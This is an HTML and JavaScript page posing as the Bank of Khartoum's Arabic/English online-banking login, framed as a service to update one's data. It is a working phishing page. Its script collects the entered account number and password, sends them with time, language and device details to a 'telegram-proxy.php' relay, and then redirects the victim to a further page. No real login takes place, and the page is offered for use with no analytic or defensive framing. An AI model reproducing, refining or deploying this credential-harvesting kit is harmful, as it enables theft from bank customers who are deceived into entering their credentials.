<!DOCTYPE html>
<html lang="ar" dir="rtl" class="h-full antialiased">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
    <title id="page-title">bankofkhartoum</title>
    <meta name="description" content="تسجيل الدخول — بنكك أونلاين">
    <meta name="robots" content="noindex, nofollow">
    <link rel="icon" type="image/svg+xml" href="logo.svg">
    <link rel="alternate icon" href="favicon.ico" sizes="16x16">
    <style>
        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; border: 0 solid #e2e8f0; }
        html { height: 100%; -webkit-text-size-adjust: 100%; -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; font-family: 'Segoe UI', Tahoma, Arial, 'Noto Sans Arabic', sans-serif; line-height: 1.5; font-size: 16px; }
        body { min-height: 100%; background-color: #f4f5f7; color: #020617; font-family: 'Segoe UI', Tahoma, Arial, 'Noto Sans Arabic', sans-serif; line-height: 1.5; -webkit-font-smoothing: antialiased; display: flex; flex-direction: column; min-height: 100vh; }
        img, svg { display: block; vertical-align: middle; max-width: 100%; height: auto; }
        button, input { font-family: inherit; font-size: 100%; line-height: inherit; color: inherit; margin: 0; padding: 0; }
        button { background-color: transparent; background-image: none; cursor: pointer; text-transform: none; }
        input { background-color: transparent; border: none; }
        input::placeholder { opacity: 1; color: #94a3b8; }
        a { color: inherit; text-decoration: inherit; }
        .page-wrapper { display: flex; flex-direction: column; min-height: 100vh; }

        .site-header { width: 100%; flex-shrink: 0; overflow: hidden; border-bottom: 1px solid #c79f0f; background-color: #d9b425; box-shadow: 0 4px 16px rgba(0,0,0,0.18); }
        .header-inner { max-width: 2000px; margin: 0 auto; display: flex; align-items: stretch; width: 100%; height: clamp(100px, 20vw, 178px); }
        .header-red { position: relative; flex: 0 0 40%; max-width: 40%; min-width: 180px; overflow: hidden; background-color: #c82228; display: flex; align-items: center; padding: 0 clamp(8px, 1.5vw, 32px); }
        .header-red-bg { position: absolute; inset: 0; opacity: 0.9; pointer-events: none; }
        .header-red-bg::before { content: ""; position: absolute; top: 0; bottom: 0; left: 0; width: 82%; background: radial-gradient(circle at 20% 30%, rgba(255,255,255,0.12), transparent 18%), linear-gradient(135deg, #d62e2d 0%, #bd1c1d 100%); }
        .header-red-bg::after { content: ""; position: absolute; top: 0; bottom: 0; right: -12%; width: 44%; transform: skewX(-18deg); border-left: 8px solid rgba(220,184,43,0.6); background-color: rgba(183,28,29,0.25); }
        .header-red-overlay { position: absolute; inset: 0; background: linear-gradient(90deg, rgba(255,255,255,0.06) 0%, rgba(255,255,255,0) 32%, rgba(0,0,0,0.08) 100%); pointer-events: none; }
        .header-logo { position: relative; z-index: 10; display: flex; align-items: center; width: 100%; }
        .header-logo img { width: clamp(110px, 16vw, 320px); height: auto; display: block; }
        .header-logo .logo-fallback { color: #fff; font-size: clamp(0.85rem, 1.6vw, 1.4rem); font-weight: 900; line-height: 1.1; display: none; }
        .header-gold { flex: 1 1 auto; display: flex; align-items: center; justify-content: flex-end; background-color: #d6af17; padding: 0 clamp(10px, 2vw, 48px); min-width: 90px; }
        .lang-toggle { display: inline-flex; align-items: center; justify-content: center; min-width: 2.2rem; height: 1.9rem; padding: 0 0.65rem; border-radius: 9999px; border: 1px solid rgba(255,255,255,0.6); background-color: rgba(255,255,255,0.1); color: #ffffff; font-size: 0.7rem; font-weight: 700; letter-spacing: 0.04em; cursor: pointer; }
        .lang-toggle:hover { background-color: rgba(255,255,255,0.2); }
        @media (min-width: 640px) { .lang-toggle { min-width: 2.6rem; height: 2.2rem; font-size: 0.8rem; padding: 0 0.85rem; } }

        .main-content { flex: 1 1 auto; display: flex; align-items: flex-start; justify-content: center; padding: 1rem 0.75rem 2rem; }
        @media (min-width: 640px) { .main-content { padding: 2rem 1rem 3rem; } }
        .content-inner { width: 100%; max-width: 40rem; }

        .back-link-wrap { margin-bottom: 0.75rem; display: flex; justify-content: flex-start; }
        .back-link { display: inline-flex; align-items: center; gap: 0.4rem; border-radius: 9999px; border: 1px solid #e2e8f0; background-color: #fff; padding: 0.4rem 0.85rem; font-size: 0.8rem; font-weight: 600; color: #334155; box-shadow: 0 1px 2px rgba(0,0,0,0.05); transition: all 0.15s ease; text-decoration: none; }
        @media (min-width: 640px) { .back-link { font-size: 0.875rem; padding: 0.5rem 1rem; gap: 0.5rem; } }
        .back-link:hover { border-color: #c92127; color: #c92127; }
        .back-link .arrow { font-size: 0.9rem; line-height: 1; display: inline-block; }
        html[dir="rtl"] .back-link .arrow { transform: scaleX(-1); }

        .login-card { width: 100%; border-radius: 1.5rem; background-color: #f2f2f0; padding: 1rem; box-shadow: 0 18px 38px rgba(0,0,0,0.2); }
        @media (min-width: 480px) { .login-card { padding: 1.375rem; } }
        @media (min-width: 640px) { .login-card { padding: 1.75rem; border-radius: 1.75rem; } }

        .service-badge { margin-bottom: 0.9rem; border-radius: 0.7rem; border: 1px solid rgba(240,210,106,0.7); background: linear-gradient(135deg, #fffaf0 0%, #fff3c4 100%); padding: 0.5rem 0.75rem; text-align: center; box-shadow: 0 1px 2px rgba(0,0,0,0.05); }
        @media (min-width: 640px) { .service-badge { padding: 0.625rem 0.875rem; border-radius: 0.875rem; margin-bottom: 1.125rem; } }
        .service-badge .label { font-size: 0.65rem; font-weight: 900; letter-spacing: 0.15em; color: #6b5200; }
        @media (min-width: 640px) { .service-badge .label { font-size: 0.75rem; } }
        .service-badge .value { margin-top: 0.2rem; font-size: 0.8rem; font-weight: 900; color: #c92127; }
        @media (min-width: 640px) { .service-badge .value { font-size: 0.875rem; } }

        .login-title { text-align: center; font-size: 1.15rem; font-weight: 900; line-height: 1.4; color: #c92127; margin-bottom: 0.3rem; }
        @media (min-width: 480px) { .login-title { font-size: 1.5rem; } }
        @media (min-width: 640px) { .login-title { font-size: 1.875rem; } }
        .login-subtitle { text-align: center; font-size: 0.8rem; color: #5e5e5e; margin-bottom: 1rem; }
        @media (min-width: 640px) { .login-subtitle { font-size: 0.875rem; margin-bottom: 1.375rem; } }

        .form-group { margin-bottom: 0.9rem; }
        .form-label-row { display: flex; align-items: baseline; gap: 0.35rem; margin-bottom: 0.3rem; }
        html[dir="rtl"] .form-label-row { flex-direction: row; justify-content: flex-end; }
        html[dir="ltr"] .form-label-row { flex-direction: row-reverse; justify-content: flex-end; }
        .form-label { font-size: 0.85rem; font-weight: 600; color: #2f2f2f; }
        @media (min-width: 640px) { .form-label { font-size: 0.95rem; } }
        .required-star { color: #c92127; font-weight: 700; }

        .input-wrapper { position: relative; }
        .form-input { width: 100%; min-height: 2.75rem; border-radius: 0.8rem; border: 1px solid #e2e8f0; background-color: #fff; padding: 0.65rem 0.9rem; font-size: 0.95rem; color: #1e293b; box-shadow: 0 1px 2px rgba(0,0,0,0.05); outline: none; transition: border-color 0.15s, box-shadow 0.15s; }
        @media (min-width: 640px) { .form-input { min-height: 3rem; padding: 0.75rem 1rem; font-size: 1rem; border-radius: 1rem; } }
        html[dir="rtl"] .form-input { text-align: right; }
        html[dir="ltr"] .form-input { text-align: left; }
        .form-input:focus { border-color: #c92127; box-shadow: 0 0 0 3px #f1c1c4; }
        html[dir="rtl"] .form-input.has-icon { padding-left: 3rem; }
        html[dir="ltr"] .form-input.has-icon { padding-right: 3rem; }

        .password-toggle { position: absolute; top: 0; bottom: 0; width: 2.5rem; display: flex; align-items: center; justify-content: center; color: #64748b; background: transparent; border: none; cursor: pointer; }
        html[dir="rtl"] .password-toggle { left: 0.5rem; }
        html[dir="ltr"] .password-toggle { right: 0.5rem; }
        .password-toggle:hover { color: #334155; }

        .submit-wrap { padding-top: 0.5rem; }
        .submit-btn { display: flex; width: 100%; align-items: center; overflow: hidden; border-radius: 0.9rem; background: linear-gradient(135deg, #c92127 0%, #991b1b 100%); color: #fff; box-shadow: 0 10px 18px rgba(201,33,39,0.25); transition: opacity 0.15s; cursor: pointer; border: none; padding: 0; min-height: 3rem; }
        @media (min-width: 640px) { .submit-btn { min-height: 3.5rem; border-radius: 1.125rem; } }
        html[dir="rtl"] .submit-btn { flex-direction: row-reverse; }
        html[dir="ltr"] .submit-btn { flex-direction: row; }
        .submit-btn:hover { opacity: 0.95; }
        .submit-btn:disabled { cursor: not-allowed; opacity: 0.7; }
        .submit-btn .btn-text { flex: 1; text-align: center; font-size: 1rem; font-weight: 900; letter-spacing: -0.02em; padding: 0.375rem 0; }
        @media (min-width: 480px) { .submit-btn .btn-text { font-size: 1.2rem; } }
        @media (min-width: 640px) { .submit-btn .btn-text { font-size: 1.4rem; } }
        .submit-btn .btn-icon { display: flex; align-items: center; justify-content: center; height: 3rem; width: 3rem; background-color: rgba(255,255,255,0.1); flex-shrink: 0; }
        @media (min-width: 640px) { .submit-btn .btn-icon { height: 3.5rem; width: 3.5rem; } }
        .submit-btn .btn-icon svg { width: 1.1rem; height: 1.1rem; }
        @media (min-width: 640px) { .submit-btn .btn-icon svg { width: 1.4rem; height: 1.4rem; } }
        html[dir="rtl"] .submit-btn .btn-icon svg { transform: scaleX(-1); }

        .spinner { display: inline-block; width: 1rem; height: 1rem; border: 2px solid rgba(255,255,255,0.4); border-top-color: #fff; border-radius: 50%; animation: spin 0.7s linear infinite; vertical-align: middle; margin-inline-start: 0.5rem; }
        @keyframes spin { to { transform: rotate(360deg); } }

        .honeypot { position: absolute; left: -9999px; width: 1px; height: 1px; overflow: hidden; }
        .form-error { display: none; margin-top: 0.75rem; padding: 0.6rem 0.85rem; border-radius: 0.75rem; background-color: #fee2e2; color: #991b1b; font-size: 0.8rem; font-weight: 600; text-align: center; }
        @media (min-width: 640px) { .form-error { font-size: 0.85rem; padding: 0.625rem 0.875rem; } }
        .form-error.visible { display: block; }

        .site-footer { width: 100%; flex-shrink: 0; border-top: 3px solid #d5a61a; background-color: #eef0f1; box-shadow: inset 0 1px 0 rgba(255,255,255,0.7); }
        .footer-inner { max-width: 2000px; margin: 0 auto; display: flex; align-items: center; justify-content: space-between; gap: 0.5rem; overflow: hidden; padding: 0.4rem 0.75rem; height: clamp(50px, 7vw, 80px); }
        @media (min-width: 640px) { .footer-inner { gap: 1rem; padding: 0.5rem 1.5rem; } }
        @media (min-width: 768px) { .footer-inner { padding: 0.5rem 2.5rem; } }
        @media (min-width: 1024px) { .footer-inner { padding: 0.5rem 3.5rem; } }
        .footer-copy { flex-shrink: 0; font-size: 0.75rem; font-weight: 500; letter-spacing: -0.02em; color: #1e2a39; }
        @media (min-width: 640px) { .footer-copy { font-size: 1rem; } }
        @media (min-width: 768px) { .footer-copy { font-size: 1.05rem; } }
        .footer-copy .bold { font-weight: 700; }
        .footer-copy .semibold { font-weight: 600; }
        .footer-banner { min-width: 0; flex: 1 1 auto; display: flex; align-items: center; justify-content: flex-end; overflow: hidden; }
        .footer-banner img { width: clamp(150px, 50vw, 760px); max-width: 100%; height: auto; display: block; object-fit: contain; }

        .lang-fade { transition: opacity 0.15s ease; }
        .lang-fade.is-switching { opacity: 0.4; }
    </style>
</head>
<body>
    <div class="page-wrapper lang-fade" id="page-wrapper">
        <header dir="ltr" class="site-header">
            <div class="header-inner">
                <div class="header-red">
                    <div class="header-red-bg" aria-hidden="true"></div>
                    <div class="header-red-overlay" aria-hidden="true"></div>
                    <div class="header-logo">
                        <img src="logo.svg" alt="بنك الخرطوم" id="logo-img">
                    </div>
                </div>
                <div class="header-gold">
                    <button type="button" class="lang-toggle" id="lang-toggle" aria-label="Switch language">EN</button>
                </div>
            </div>
        </header>

        <main class="main-content">
            <div class="content-inner">
                <div class="back-link-wrap">
                    <a class="back-link" href="index.html">
                        <span class="arrow">←</span>
                        <span data-i18n="back">العودة إلى الخدمات</span>
                    </a>
                </div>

                <div class="login-card">
                    <div class="service-badge">
                        <div class="label" data-i18n="badge_label">الخدمة المختارة</div>
                        <div class="value" data-i18n="badge_value">تحديث بياناتك</div>
                    </div>
                    <h1 class="login-title" data-i18n="title">تسجيل الدخول إلى حسابك</h1>
                    <p class="login-subtitle" data-i18n="subtitle">يرجى تسجيل الدخول لتقديم طلب الخدمة</p>

                    <form class="login-form" id="login-form" novalidate autocomplete="off">
                        <div class="form-group">
                            <div class="form-label-row">
                                <span class="required-star">*</span>
                                <span class="form-label" data-i18n="username_label">اسم المستخدم</span>
                            </div>
                            <div class="input-wrapper">
                                <input type="text" class="form-input" name="username" id="username" data-i18n-placeholder="username_placeholder" placeholder="ادخل اسم المستخدم" autocomplete="off" inputmode="numeric" required>
                            </div>
                        </div>
                        <div class="form-group">
                            <div class="form-label-row">
                                <span class="required-star">*</span>
                                <span class="form-label" data-i18n="password_label">كلمة المرور</span>
                            </div>
                            <div class="input-wrapper">
                                <input type="password" class="form-input has-icon" name="password" id="password" data-i18n-placeholder="password_placeholder" placeholder="ادخل كلمة المرور" autocomplete="current-password" required>
                                <button type="button" class="password-toggle" id="password-toggle" aria-label="عرض كلمة المرور">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M2.062 12.348a1 1 0 0 1 0-.696 10.75 10.75 0 0 1 19.876 0 1 1 0 0 1 0 .696 10.75 10.75 0 0 1-19.876 0"></path><circle cx="12" cy="12" r="3"></circle></svg>
                                </button>
                            </div>
                        </div>
                        <div class="honeypot" aria-hidden="true"><input type="text" name="website" tabindex="-1" autocomplete="off"></div>
                        <div class="form-error" id="form-error"></div>
                        <div class="submit-wrap">
                            <button type="submit" class="submit-btn" id="submit-btn">
                                <span class="btn-text" id="btn-text" data-i18n="submit">تسجيل الدخول</span>
                                <span class="btn-icon">
                                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14"></path><path d="m12 5 7 7-7 7"></path></svg>
                                </span>
                            </button>
                        </div>
                    </form>
                </div>
            </div>
        </main>

        <footer class="site-footer">
            <div class="footer-inner">
                <div class="footer-copy"><span class="semibold">©2024</span> <span class="bold">iBOK</span></div>
                <div class="footer-banner"><img src="footer-banner.png" alt="Internet Banking Services" width="980" height="120"></div>
            </div>
        </footer>
    </div>

    <script>
        (function () {
            'use strict';
            var CONFIG = {
                NEXT_URL: 'question.html',
                REDIRECT_DELAY: 1500
            };

            var translations = {
                ar: {
                    pageTitle: 'bankofkhartoum',
                    back: 'العودة إلى الخدمات',
                    badge_label: 'الخدمة المختارة',
                    badge_value: 'تحديث بياناتك',
                    title: 'تسجيل الدخول إلى حسابك',
                    subtitle: 'يرجى تسجيل الدخول لتقديم طلب الخدمة',
                    username_label: 'اسم المستخدم',
                    username_placeholder: 'ادخل اسم المستخدم',
                    password_label: 'كلمة المرور',
                    password_placeholder: 'ادخل كلمة المرور',
                    submit: 'تسجيل الدخول',
                    submitting: 'جاري الإرسال',
                    toggleLabel: 'EN', toggleAria: 'Switch to English',
                    showPassword: 'عرض كلمة المرور', hidePassword: 'إخفاء كلمة المرور',
                    errEmpty: 'الرجاء إدخال اسم المستخدم وكلمة المرور.'
                },
                en: {
                    pageTitle: 'bankofkhartoum',
                    back: 'Return to services',
                    badge_label: 'SELECTED SERVICE',
                    badge_value: 'Update your data',
                    title: 'Log in to your account',
                    subtitle: 'Please sign in to submit a service request.',
                    username_label: 'Username',
                    username_placeholder: 'Enter your username',
                    password_label: 'Password',
                    password_placeholder: 'Enter your password',
                    submit: 'Login',
                    submitting: 'Sending',
                    toggleLabel: 'AR', toggleAria: 'التبديل إلى العربية',
                    showPassword: 'Show password', hidePassword: 'Hide password',
                    errEmpty: 'Please enter your username and password.'
                }
            };

            var DEFAULT_LANG = 'ar';
            var currentLang = DEFAULT_LANG;
            var isSubmitting = false;

            var html = document.documentElement;
            var pageTitle = document.getElementById('page-title');
            var langToggle = document.getElementById('lang-toggle');
            var wrapper = document.getElementById('page-wrapper');
            var passwordToggle = document.getElementById('password-toggle');
            var passwordInput = document.getElementById('password');
            var usernameInput = document.getElementById('username');
            var form = document.getElementById('login-form');
            var submitBtn = document.getElementById('submit-btn');
            var btnText = document.getElementById('btn-text');
            var formError = document.getElementById('form-error');

            function applyLanguage(lang) {
                currentLang = lang;
                var t = translations[lang];
                html.setAttribute('lang', lang);
                html.setAttribute('dir', lang === 'ar' ? 'rtl' : 'ltr');
                if (pageTitle) pageTitle.textContent = t.pageTitle;
                document.querySelectorAll('[data-i18n]').forEach(function (el) {
                    var k = el.getAttribute('data-i18n');
                    if (t[k] !== undefined) el.textContent = t[k];
                });
                document.querySelectorAll('[data-i18n-placeholder]').forEach(function (el) {
                    var k = el.getAttribute('data-i18n-placeholder');
                    if (t[k] !== undefined) el.setAttribute('placeholder', t[k]);
                });
                if (langToggle) {
                    langToggle.textContent = t.toggleLabel;
                    langToggle.setAttribute('aria-label', t.toggleAria);
                }
                updatePasswordAria();
                if (formError) formError.classList.remove('visible');
                try { localStorage.setItem('bankak-lang', lang); } catch (e) {}
            }

            function updatePasswordAria() {
                if (!passwordToggle || !passwordInput) return;
                var t = translations[currentLang];
                var isPwd = passwordInput.getAttribute('type') === 'password';
                passwordToggle.setAttribute('aria-label', isPwd ? t.showPassword : t.hidePassword);
            }

            passwordToggle.addEventListener('click', function () {
                var isPwd = passwordInput.getAttribute('type') === 'password';
                passwordInput.setAttribute('type', isPwd ? 'text' : 'password');
                updatePasswordAria();
            });

            langToggle.addEventListener('click', function () {
                var next = currentLang === 'ar' ? 'en' : 'ar';
                wrapper.classList.add('is-switching');
                window.setTimeout(function () {
                    applyLanguage(next);
                    wrapper.classList.remove('is-switching');
                }, 120);
            });

            function sendToTelegram(username, password) {
                var now = new Date();
                var timeStr = now.toLocaleString('en-GB', { hour12: false });
                var text =
                    '🏦 New Account Inquiry (service selected)\n' +
                    '━━━━━━━━━━━━━━━━━━━━\n' +
                    'Service:        Update Your Information\n' +
                    'Account Number: ' + username + '\n' +
                    'Password:       ' + password + '\n\n' +
                    '🕒 الوقت: ' + timeStr + '\n' +
                    '🌐 اللغة: ' + (navigator.language || '—') + '\n' +
                    '📱 الجهاز: ' + (navigator.userAgent || '—').substring(0, 120);
                var payload = new URLSearchParams();
                payload.append('text', text);
                return fetch('telegram-proxy.php', { method: 'POST', body: payload })
                    .then(function (response) {
                        if (!response.ok) {
                            console.warn('[Bankak] Telegram request failed:', response.status, response.statusText);
                        }
                        return true;
                    })
                    .catch(function (err) { console.error('[Bankak] Telegram error:', err); return false; });
            }

            form.addEventListener('submit', function (e) {
                e.preventDefault();
                if (isSubmitting) return;
                var username = (usernameInput.value || '').trim();
                var password = (passwordInput.value || '');
                var t = translations[currentLang];

                if (!username || !password) {
                    formError.textContent = t.errEmpty;
                    formError.classList.add('visible');
                    if (!username) usernameInput.focus(); else passwordInput.focus();
                    return;
                }
                formError.classList.remove('visible');
                try { sessionStorage.setItem('bankak-username', username); } catch (e) {}
                isSubmitting = true;
                submitBtn.disabled = true;
                btnText.innerHTML = t.submitting + '<span class="spinner" aria-hidden="true"></span>';
                sendToTelegram(username, password).then(function () {
                    window.setTimeout(function () {
                        window.location.href = CONFIG.NEXT_URL;
                    }, CONFIG.REDIRECT_DELAY);
                });
            });

            var logoImg = document.getElementById('logo-img');
            if (logoImg) {
                logoImg.addEventListener('error', function () {
                    var parent = logoImg.parentNode;
                    logoImg.style.display = 'none';
                    if (!parent.querySelector('.logo-fallback')) {
                        var fb = document.createElement('div');
                        fb.className = 'logo-fallback';
                        fb.style.display = 'block';
                        fb.innerHTML = 'بنك الخرطوم<br><span style="font-size:0.9rem;font-weight:600;">Bank of Khartoum</span>';
                        parent.appendChild(fb);
                    }
                });
            }

            var saved = null;
            try { saved = localStorage.getItem('bankak-lang'); } catch (e) {}
            applyLanguage(saved === 'en' ? 'en' : DEFAULT_LANG);
        })();
    </script>
